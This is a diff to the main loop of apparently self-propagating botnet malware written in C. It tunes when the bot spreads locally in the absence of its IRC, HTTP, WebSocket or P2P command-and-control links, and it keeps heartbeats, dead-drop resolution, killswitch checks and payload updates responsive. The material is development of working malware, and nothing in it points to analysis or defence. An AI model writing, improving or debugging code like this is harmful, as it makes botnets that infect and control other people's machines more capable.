@@ -408,10 +408,9 @@ int main(void) {
     
     /* Heartbeat timer */
     time_t last_heartbeat = time(NULL);
-    /* Dead-drop re-resolution timer (#86) */
-    time_t last_dead_drop = time(NULL);
-    /* Global killswitch re-check timer (#130) */
+    time_t last_dead_drop = time(NULL);   /* Dead-drop re-resolution timer (#86) */
     time_t last_killswitch = time(NULL);
+    time_t last_spread = 0;               /* #188: spread deadline (0 = due now) */
     
     while (g_running) {
         /* Try to connect to C2 */
@@ -448,11 +447,17 @@ int main(void) {
          * autonomous spreading, while a connected bot waits for operator
          * commands (#95). (#139): a bot with live P2P peers is also
          * operator-attached (the mesh can still deliver commands), so it
-         * must not run spread_local either. */
+         * must not run spread_local either.
+         * #188: spreading runs on its own scan_interval deadline instead of
+         * the loop sleep — `sleep 3600` must not freeze command processing,
+         * heartbeats, or the killswitch check for an hour. */
         if (!g_bot.c2_irc.connected && !g_bot.c2_http.connected &&
-            !g_bot.c2_ws.connected && !mesh_has_peers()) {
+            !g_bot.c2_ws.connected && !mesh_has_peers() &&
+            time(NULL) - last_spread >= (time_t)(g_bot.scan_interval > 0
+                                                 ? g_bot.scan_interval : 1)) {
             log_info("Primary C2 unavailable, spreading locally");
             spread_local(&g_bot);
+            last_spread = time(NULL);
         }
         
         /* Periodic heartbeat (on HEARTBEAT_INTERVAL timer, not every loop) */
@@ -479,9 +484,11 @@ int main(void) {
          * internal timer). Previously payload_check_update() was dead code
          * — CMD_UPDATE was the only update path and it was a stub. */
         payload_check_update(&g_bot);
-        
-        /* Sleep until next scan cycle */
-        usleep(g_bot.scan_interval * 1000000);
+
+        /* #188: short fixed tick. scan_interval now gates only the spread
+         * deadline (above), so `sleep`/scan_interval can no longer stall
+         * command processing, heartbeats, dead-drop, or the killswitch. */
+        usleep(1000000);
     }
     
     cleanup_bot();
